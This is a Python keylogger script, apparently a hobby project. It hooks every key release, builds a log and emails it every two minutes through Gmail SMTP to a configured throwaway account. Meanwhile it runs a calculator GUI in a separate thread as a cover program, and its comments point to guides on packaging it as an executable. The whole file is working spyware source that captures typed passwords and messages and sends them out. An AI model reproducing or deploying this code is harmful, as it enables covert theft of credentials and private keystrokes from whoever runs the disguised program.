import keyboard # keylogging
import smtplib # sending emails

# sending logs per period of time
from threading import Timer, Thread
from datetime import datetime

# includes email address and pw of my throwaway account
import config
import util.helper
# import calculator GUI
import util.calc as calc

# global parameters
# seconds before email is sent (modify to your liking)
REPORT_INTERVAL = 120
EMAIL_ADDRESS = config.EMAIL_ADDRESS
EMAIL_PW = config.EMAIL_PW

class Keylogger:
    def __init__(self, interval, report_mode='email'):
        self.interval = interval
        self.report_mode = report_mode
        # the log of all keystrokes within the interval...
        self.log = ""
        # recording start and end dates
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    # use keyboard's on_release() function, calling this callback function on
    # every KEY_UP event, recording it to the existing log.
    def callback(self, event):
        # in keyboard, event is each keystroke
        name = event.name
        # input parsing
        # if the key is a special character (i.e. length > 1)
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\r\n"
            elif name == "shift":
                name = "[SHIFT]"
            elif name == "ctrl":
                name = "[CTRL]"
            elif name == "alt":
                name = "[ALT]"
            elif name == "tab":
                name = "[TAB]"
            elif name == "backspace":
                # consider removing last character from log
                # would have to have a special case for the [] characters in the above statements
                name = "[BCKSPC]"

        self.log += name
    
    def send_email(self, email, pwd, log):
        # formatting msg object to include a subject, the start and end date of the log
        # replacing microseconds with 0, to make dates easier to read
        subject = "log: " + str(self.start_dt.replace(microsecond=0)) + " -> " + str(self.end_dt.replace(microsecond=0))
        msg = 'Subject: {}\n\n{}'.format(subject, log)
        try:
            # using starttls()
            server = smtplib.SMTP(host='smtp.gmail.com', port=587)
            server.starttls()

            # login to email account provided
            server.login(email, pwd)
            # send the log as a message
            server.sendmail(email, email, msg)
        except Exception as e:
            print(e)    
        finally:
            # a very obvious message hinting at the existence of this keylogger...
            print(r"""
   ('-.  _   .-')      ('-.                               .-')      ('-.       .-') _  .-') _   ,---. 
 _(  OO)( '.( OO )_   ( OO ).-.                          ( OO ).  _(  OO)     ( OO ) )(  OO) )  |   | 
(,------.,--.   ,--.) / . --. /  ,-.-')  ,--.           (_)---\_)(,------.,--./ ,--,' /     '._ |   | 
 |  .---'|   `.'   |  | \-.  \   |  |OO) |  |.-')       /    _ |  |  .---'|   \ |  |\ |'--...__)|   | 
 |  |    |         |.-'-'  |  |  |  |  \ |  | OO )      \  :` `.  |  |    |    \|  | )'--.  .--'|   | 
(|  '--. |  |'.'|  | \| |_.'  |  |  |(_/ |  |`-' |       '..`''.)(|  '--. |  .     |/    |  |   |  .' 
 |  .--' |  |   |  |  |  .-.  | ,|  |_.'(|  '---.'      .-._)   \ |  .--' |  |\    |     |  |   `--'  
 |  `---.|  |   |  |  |  | |  |(_|  |    |      |       \       / |  `---.|  | \   |     |  |   .--.  
 `------'`--'   `--'  `--' `--'  `--'    `------'        `-----'  `------'`--'  `--'     `--'   '--'  
             """)
            # terminate
            server.quit()

    # driver function, calls itself recursively using Timer to keep reporting on
    # keypress status
    def driver(self):
        if self.log:
            # if a keypress has been recorded in the interval
            self.end_dt = datetime.now()

            # if statement is relevant if I ever want to include saving to local
            # log file, as opposed to email
            if self.report_mode == 'email':
                self.send_email(EMAIL_ADDRESS, EMAIL_PW, self.log)

            # update start date of new log
            self.start_dt = datetime.now()
        # reset log!
        self.log = ''
        # call itself after a certain time
        timer = Timer(interval=self.interval, function=self.driver)
        # setting the thread as daemon means it dies when main thread dies
        timer.daemon = True
        timer.start()

    # calls the callback, defined above
    # starts the keylogger and runs the driver
    def start(self):
        self.start_dt = datetime.now()
        # begins keylogger
        keyboard.on_release(callback=self.callback)
        # begin reporting on logs
        self.driver()
        # block curr thread TODO: experiment with htis
        # should keep recording keystrokes until ctrl+c is pressed...
        keyboard.wait()

if __name__ == '__main__':
    # initialise logger
    my_logger = Keylogger(interval=REPORT_INTERVAL, report_mode='email')

    # use threading to begin the two tasks
    # By setting t2 (logger) to daemon, they're killed when the main program ends
    # https://www.geeksforgeeks.org/python-different-ways-to-kill-a-thread/
    t1 = Thread(target=calc.calc_init)
    t2 = Thread(target=my_logger.start)
    t2.daemon = True

    t1.start()
    t2.start()

# guides used:
# https://www.geeksforgeeks.org/convert-python-script-to-exe-file/
# https://pyinstaller.readthedocs.io/en/stable/usage.html
# https://github.com/boppreh/keyboard#api
# https://www.youtube.com/watch?v=9WPmxH4RRZ0
# https://www.youtube.com/watch?v=UZX5kH72Yx4
# https://www.thepythoncode.com/article/write-a-keylogger-python